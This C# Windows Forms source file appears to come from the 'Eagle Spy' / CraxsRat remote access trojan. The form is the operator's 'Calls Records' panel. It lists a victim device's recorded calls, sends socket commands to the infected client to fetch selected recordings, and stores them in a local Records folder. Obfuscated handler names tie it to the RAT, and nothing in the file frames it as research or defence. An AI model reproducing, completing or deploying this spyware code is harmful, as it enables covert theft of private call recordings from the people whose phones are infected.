using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class Calls_Records : Form
{
	public delegate void AddNew(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon4")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon1")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	public string Title;

	public Client ClassClient;

	public TcpClient Client;

	public string DownloadsFolder;

	[field: AccessedThroughProperty("DataGridView1")]
	internal DataGridView DataGridView1
	;

	[field: AccessedThroughProperty("thestat")]
	internal DataGridViewTextBoxColumn thestat
    ;
    [field: AccessedThroughProperty("ico")]
	internal DataGridViewImageColumn ico
    ;

    [field: AccessedThroughProperty("num")]
	internal DataGridViewTextBoxColumn num
    ;
    [field: AccessedThroughProperty("appnam")]
	internal DataGridViewTextBoxColumn appnam
    ;

    [field: AccessedThroughProperty("stus")]
	internal DataGridViewTextBoxColumn stus
    ;

    [field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
    ;

	internal DrakeUIButtonIcon DrakeUIButtonIcon4
	;

	internal DrakeUIButtonIcon DrakeUIButtonIcon1
;

	[field: AccessedThroughProperty("loadingbar")]
	internal DrakeUILoadingBar loadingbar
    ;

	internal DrakeUIButtonIcon DrakeUIButtonIcon2
	;

	public Calls_Records()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf;
		base.FormClosing += Calls_Records_FormClosing;
		Title = "null";
		Client = new TcpClient();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
            this.DataGridView1 = new System.Windows.Forms.DataGridView();
            this.thestat = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.ico = new System.Windows.Forms.DataGridViewImageColumn();
            this.num = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.appnam = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.stus = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.loadingbar = new DrakeUI.Framework.DrakeUILoadingBar();
            this.DrakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.DrakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            ((System.ComponentModel.ISupportInitialize)(this.DataGridView1)).BeginInit();
            this.Panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // DataGridView1
            // 
            this.DataGridView1.AllowUserToAddRows = false;
            this.DataGridView1.AllowUserToDeleteRows = false;
            this.DataGridView1.AllowUserToResizeColumns = false;
            this.DataGridView1.AllowUserToResizeRows = false;
            dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle6.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DataGridView1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
            this.DataGridView1.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DataGridView1.BackgroundColor = System.Drawing.Color.Black;
            dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle7.BackColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle7.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            dataGridViewCellStyle7.ForeColor = System.Drawing.SystemColors.WindowText;
            dataGridViewCellStyle7.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle7.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataGridView1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
            this.DataGridView1.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DataGridView1.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.thestat,
            this.ico,
            this.num,
            this.appnam,
            this.stus});
            dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle8.BackColor = System.Drawing.SystemColors.Window;
            dataGridViewCellStyle8.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            dataGridViewCellStyle8.ForeColor = System.Drawing.SystemColors.ControlText;
            dataGridViewCellStyle8.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle8.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DataGridView1.DefaultCellStyle = dataGridViewCellStyle8;
            this.DataGridView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DataGridView1.Location = new System.Drawing.Point(0, 51);
            this.DataGridView1.Name = "DataGridView1";
            this.DataGridView1.ReadOnly = true;
            dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle9.BackColor = System.Drawing.SystemColors.Control;
            dataGridViewCellStyle9.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            dataGridViewCellStyle9.ForeColor = System.Drawing.SystemColors.WindowText;
            dataGridViewCellStyle9.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle9.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DataGridView1.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
            this.DataGridView1.RowHeadersVisible = false;
            dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
            dataGridViewCellStyle10.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25F);
            this.DataGridView1.RowsDefaultCellStyle = dataGridViewCellStyle10;
            this.DataGridView1.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DataGridView1.ShowCellErrors = false;
            this.DataGridView1.ShowCellToolTips = false;
            this.DataGridView1.ShowEditingIcon = false;
            this.DataGridView1.ShowRowErrors = false;
            this.DataGridView1.Size = new System.Drawing.Size(593, 390);
            this.DataGridView1.TabIndex = 2;
            // 
            // thestat
            // 
            this.thestat.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
            this.thestat.HeaderText = "Status";
            this.thestat.Name = "thestat";
            this.thestat.ReadOnly = true;
            this.thestat.Width = 50;
            // 
            // ico
            // 
            this.ico.FillWeight = 25F;
            this.ico.HeaderText = "     ";
            this.ico.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
            this.ico.Name = "ico";
            this.ico.ReadOnly = true;
            // 
            // num
            // 
            this.num.FillWeight = 86.49746F;
            this.num.HeaderText = "Number";
            this.num.Name = "num";
            this.num.ReadOnly = true;
            // 
            // appnam
            // 
            this.appnam.FillWeight = 86.49746F;
            this.appnam.HeaderText = "Date";
            this.appnam.Name = "appnam";
            this.appnam.ReadOnly = true;
            // 
            // stus
            // 
            this.stus.FillWeight = 86.49746F;
            this.stus.HeaderText = "Downloaded";
            this.stus.Name = "stus";
            this.stus.ReadOnly = true;
            // 
            // Panel1
            // 
            this.Panel1.Controls.Add(this.loadingbar);
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon2);
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon4);
            this.Panel1.Controls.Add(this.DrakeUIButtonIcon1);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(593, 51);
            this.Panel1.TabIndex = 5;
            // 
            // loadingbar
            // 
            this.loadingbar.Enabled = false;
            this.loadingbar.Font = new System.Drawing.Font("Calibri", 12F);
            this.loadingbar.ForeColor = System.Drawing.Color.Lime;
            this.loadingbar.Location = new System.Drawing.Point(526, 6);
            this.loadingbar.Name = "loadingbar";
            this.loadingbar.Size = new System.Drawing.Size(55, 32);
            this.loadingbar.Style = DrakeUI.Framework.UIStyle.Custom;
            this.loadingbar.TabIndex = 21;
            this.loadingbar.Text = "DrakeUILoadingBar1";
            this.loadingbar.Visible = false;
            // 
            // DrakeUIButtonIcon2
            // 
            this.DrakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.Font = new System.Drawing.Font("Bahnschrift SemiBold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.Location = new System.Drawing.Point(391, 12);
            this.DrakeUIButtonIcon2.Name = "DrakeUIButtonIcon2";
            this.DrakeUIButtonIcon2.Radius = 6;
            this.DrakeUIButtonIcon2.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon2.Size = new System.Drawing.Size(118, 26);
            this.DrakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon2.Symbol = 61473;
            this.DrakeUIButtonIcon2.TabIndex = 20;
            this.DrakeUIButtonIcon2.Text = "Refresh";
            this.DrakeUIButtonIcon2.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw);
            // 
            // DrakeUIButtonIcon4
            // 
            this.DrakeUIButtonIcon4.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon4.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon4.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon4.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon4.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.Font = new System.Drawing.Font("Bahnschrift SemiBold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUIButtonIcon4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.Location = new System.Drawing.Point(176, 12);
            this.DrakeUIButtonIcon4.Name = "DrakeUIButtonIcon4";
            this.DrakeUIButtonIcon4.Radius = 6;
            this.DrakeUIButtonIcon4.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon4.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon4.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon4.Size = new System.Drawing.Size(163, 26);
            this.DrakeUIButtonIcon4.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon4.Symbol = 61564;
            this.DrakeUIButtonIcon4.TabIndex = 19;
            this.DrakeUIButtonIcon4.Text = "Records Folder";
            this.DrakeUIButtonIcon4.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz);
            // 
            // DrakeUIButtonIcon1
            // 
            this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.Font = new System.Drawing.Font("Bahnschrift SemiBold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(12, 12);
            this.DrakeUIButtonIcon1.Name = "DrakeUIButtonIcon1";
            this.DrakeUIButtonIcon1.Radius = 6;
            this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.White;
            this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(129, 26);
            this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon1.Symbol = 57490;
            this.DrakeUIButtonIcon1.TabIndex = 18;
            this.DrakeUIButtonIcon1.Text = "Download";
            this.DrakeUIButtonIcon1.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx);
            // 
            // Calls_Records
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Black;
            this.ClientSize = new System.Drawing.Size(593, 441);
            this.Controls.Add(this.DataGridView1);
            this.Controls.Add(this.Panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow;
            this.Name = "Calls_Records";
            this.ShowIcon = false;
            this.Text = "Sounds Recorded";
            ((System.ComponentModel.ISupportInitialize)(this.DataGridView1)).EndInit();
            this.Panel1.ResumeLayout(false);
            this.ResumeLayout(false);

	}

	public void Addrecord(object[] objs)
	{
		if (DataGridView1.InvokeRequired)
		{
			AddNew method = Addrecord;
			DataGridView1.Invoke(method, new object[1] { objs });
			return;
		}
		try
		{
			int index = DataGridView1.Rows.Add(objs[0], objs[1], objs[2], objs[3], objs[5]);
			DataGridViewRow dataGridViewRow = DataGridView1.Rows[index];
			dataGridViewRow.Tag = RuntimeHelpers.GetObjectValue(objs[6]);
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdzxcf(object sender, EventArgs e)
	{
		if (ClassClient != null)
		{
			string[] array = ClassClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "GRC<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + ClassClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				ClassClient
			};
			ClassClient.SendMessage(parametersObjects);
			loadingbar.Enabled = true;
			loadingbar.Visible = true;
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsaercx(object sender, EventArgs e)
	{
		if (ClassClient == null)
			return;
		if (DataGridView1.SelectedRows.Count > 0)
		{
			foreach (object selectedRow in DataGridView1.SelectedRows)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(selectedRow);
				string[] array = ClassClient.Keys.Split(':');
				int num = 0;
				int num2 = 0;
				if (NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null) != null)
				{
					object[] parametersObjects = new object[4]
					{
						ClassClient.myClient,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "gtrc<*>" + NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null).ToString() + "#", NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null)), Data.SPL_SOCKET), array[0]), Data.SPL_SOCKET), array[1]), Data.SPL_SOCKET), SecurityKey.Lockscreen), Data.SPL_SOCKET), Conversions.ToString(num)), Data.SPL_SOCKET), Conversions.ToString(num2)), Data.SPL_SOCKET), Data.SPL_ARRAY), Data.SPL_SOCKET), ClassClient.ClientRemoteAddress),
						Codes.Encoding().GetBytes("null"),
						ClassClient
					};
					ClassClient.SendMessage(parametersObjects);
				}
			}
			return;
		}
		Interaction.MsgBox("Select Record To Download!!!", MsgBoxStyle.MsgBoxHelp);
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatswfebcz(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(DownloadsFolder + "\\Records"))
				Directory.CreateDirectory(DownloadsFolder + "\\Records");
			Process.Start(DownloadsFolder + "\\Records");
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void Calls_Records_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			loadingbar.Visible = false;
			loadingbar.Enabled = false;
			loadingbar.Dispose();
		}
		catch (Exception)
		{
			//ProjectData.SetProjectError(projectError);
			//////CraxsAlert.Showinformation("Sorry");
		}
	}

	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsrhtsqw(object sender, EventArgs e)
	{
		if (ClassClient != null)
		{
			string[] array = ClassClient.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "GRC<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + ClassClient.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				ClassClient
			};
			ClassClient.SendMessage(parametersObjects);
			loadingbar.Enabled = true;
			loadingbar.Visible = true;
		}
	}
}
